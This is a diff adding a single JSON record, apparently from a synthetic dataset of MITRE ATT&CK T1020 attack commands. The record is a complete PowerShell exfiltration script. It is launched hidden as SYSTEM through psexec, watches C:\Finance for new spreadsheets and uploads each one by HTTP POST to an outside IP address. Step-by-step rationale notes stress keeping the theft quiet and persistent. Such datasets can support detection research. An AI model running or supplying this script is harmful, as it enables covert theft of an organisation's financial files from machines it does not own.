@@ -1,0 +1,24 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "psexec -accepteula -s -d powershell -NoProfile -WindowStyle Hidden -Command \"$ProgressPreference='SilentlyContinue'; $sent='C:\\ProgramData\\.sent'; New-Item -ItemType Directory -Path $sent -Force | Out-Null; $w=New-Object IO.FileSystemWatcher; $w.Path='C:\\Finance'; $w.Filter='*.xlsx'; $w.IncludeSubdirectories=$true; Register-ObjectEvent -InputObject $w -EventName Created -Action { try { $f=$Event.SourceEventArgs.FullPath; Invoke-WebRequest -Uri 'https://198.51.100.50/upload' -Method Post -InFile $f -UseBasicParsing | Out-Null; Move-Item -Force $f (Join-Path 'C:\\ProgramData\\.sent' ([IO.Path]::GetFileName($f))) } catch {} } | Out-Null; $w.EnableRaisingEvents=$true; Start-Sleep -Seconds 999999\"",
+  "explanation": "Automates exfiltration of newly created .xlsx files using a FileSystemWatcher and HTTP POST. Runs as SYSTEM and detached to persist quietly; sent files are moved to a holding folder to prevent re-sending.",
+  "rationale_steps": [
+    "Launch hidden SYSTEM PowerShell via PSExec to reduce user visibility.",
+    "Create a FileSystemWatcher on C:\\Finance for *.xlsx, including subdirectories.",
+    "On Created events, upload the file via Invoke-WebRequest POST to the remote endpoint.",
+    "Move the file to C:\\ProgramData\\.sent to mark it as already exfiltrated.",
+    "Keep the process alive with a long sleep to maintain the event subscription."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-8bc12c8e-e061dbcf",
+  "source_prompt_hash": "8bc12c8e",
+  "timestamp_utc": "2025-09-30T08:56:54.215628Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
